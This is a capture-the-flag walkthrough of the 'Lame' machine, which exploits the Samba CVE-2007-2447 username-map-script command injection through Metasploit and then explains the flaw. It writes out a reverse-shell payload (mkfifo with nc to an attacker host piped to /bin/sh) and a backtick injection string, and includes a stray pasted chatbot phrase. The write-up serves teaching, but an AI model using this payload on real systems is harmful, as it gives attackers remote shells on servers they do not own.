# Lame

#### What are Shell Metacharacters?

Shell metacharacters are special characters in shell (like bash) that have specific functions, allowing users to control how commands are executed. Some common metacharacters include:

* `;` : Command separator. Allows running multiple commands in sequence.
* `|` : Pipe. Sends the output of one command as input to another.
* `>` and `>>` : Redirection operators. Redirects output to a file.
* `<` : Redirects input from a file.
* `&` : Background execution. Runs a command in the background.
* `$(command)` or `` `command` `` : Command substitution. Runs a command and replaces it with its output.



Perform an nmap scan using the -sV switch. We see we get a response with multiple services up and running on the target server.&#x20;

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

If we do some basic research, we identify some vulnerabilities relating to the Samba version running on the server.&#x20;



Samba is a suite of programs that implements the Server Message Block (SMB) protocol, which includes NetBIOS over TCP/IP (NBT). SMB is a network file sharing protocol that allows computers and servers to communicate with other systems using network ports. NetBIOS is an older transport layer that allows Windows computers to communicate with each other on the same network.



For the machine, we are going to utilizie CVE-2007-2447 which as defined by CVE, "allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management."



Luckily, we see Metasploit already has a script to exploit this vulnerability.&#x20;

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

You will find the user flag in the /home/makis directory

Type Shell to spawn a new shell in your CMD and locate the root flag by typing cd /root

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



Here is the Metasploit script that actually performs the exploit.



#### Example Execution Flow

1. **Username Injection**:
   * When Samba processes the username field `/=`nohup mkfifo /tmp/hago; nc lhost lport 0\</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago\`\`:
2. **Command Execution**:
   * The shell interprets the backticks and executes the command inside them.
   * `mkfifo /tmp/hago` is executed, creating a named pipe.
   * `nc lhost lport 0</tmp/hago | /bin/sh >/tmp/hago 2>&1` is executed, establishing a reverse shell connection to the attacker's machine.
   * `rm /tmp/hago` is executed, cleaning up the named pipe
   * The backticks `` ` ` `` around `nohup " + payload + "` ensure that this string is treated as a command and executed by the shell.
   * `nohup` ensures that the command runs to completion without being interrupted by hangup signals.

By carefully crafting the payload and using shell metacharacters, the attacker is able to execute arbitrary commands on the vulnerable server, leading to a reverse shell and potentially complete control over the target system.

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Sure! Let's break down the details of the vulnerability in Samba's MS-RPC functionality and understand how it allows remote attackers to execute arbitrary commands using shell metacharacters.

#### Overview of the Vulnerability

1. **Samba Versions Affected**:
   * The vulnerability exists in Samba versions 3.0.0 through 3.0.25rc3.
2. **Component Involved**:
   * The issue is within the MS-RPC (Microsoft Remote Procedure Call) functionality of the `smbd` service in Samba.
3. **Vulnerability Description**:
   * The vulnerability allows remote attackers to execute arbitrary commands on the server by exploiting the way certain functions handle shell metacharacters.

#### Key Points of the Vulnerability

1. **SamrChangePassword Function**:
   * One of the specific functions affected by this vulnerability is `SamrChangePassword`.
   * If the `username map script` option is enabled in the `smb.conf` configuration file, an attacker can exploit this function.
   * The `username map script` option allows mapping of usernames using an external script, which can be exploited if not properly sanitized.
2. **Other Affected Functions**:
   * The vulnerability also affects other MS-RPC functions related to:
     * (2) Remote printer management.
     * (3) File share management.
   * Remote authenticated users can exploit these functions to execute arbitrary commands.

#### Exploit Mechanism

1. **Shell Metacharacters**:
   * Shell metacharacters (like `;`, `|`, `&&`, etc.) have special meanings in shell commands and can be used to inject and execute additional commands.
2. **Injection Point**:
   * The vulnerability arises when user input is improperly handled and passed to the shell without adequate sanitization.
   * For instance, if an attacker can control input that is processed by the `username map script`, they can include shell metacharacters to inject arbitrary commands.
3. **Command Execution**:
   * When the vulnerable MS-RPC function processes the injected input, it inadvertently executes the commands included by the attacker due to the presence of shell metacharacters.

#### Example Scenario

1. **Configuration**:
   *   Assume `username map script` is enabled in `smb.conf`:

       ```ini
       [global]
       username map script = /path/to/script
       ```
2. **Exploitation via SamrChangePassword**:
   * An attacker sends a specially crafted request to the Samba server, targeting the `SamrChangePassword` function.
   *   The request includes a malicious username that contains shell metacharacters and arbitrary commands:

       ```sh
       /=`command`
       ```
   * When Samba processes this input, it executes the `command` inside the backticks due to improper sanitization.
3. **Impact**:
   * The attacker can execute any command with the privileges of the Samba service, potentially gaining control over the server.

#### Summary

* **Vulnerable Versions**: Samba 3.0.0 through 3.0.25rc3.
* **Exploited Functions**: `SamrChangePassword`, and other MS-RPC functions related to remote printer and file share management.
* **Enabling Factor**: The `username map script` option in `smb.conf`.
* **Attack Mechanism**: Injection of shell metacharacters into user input processed by vulnerable functions, leading to arbitrary command execution.

By exploiting this vulnerability, attackers can gain unauthorized access to the system, execute arbitrary commands, and potentially compromise the server. It's crucial to properly sanitize input and update to a patched version of Samba to mitigate this vulnerability.
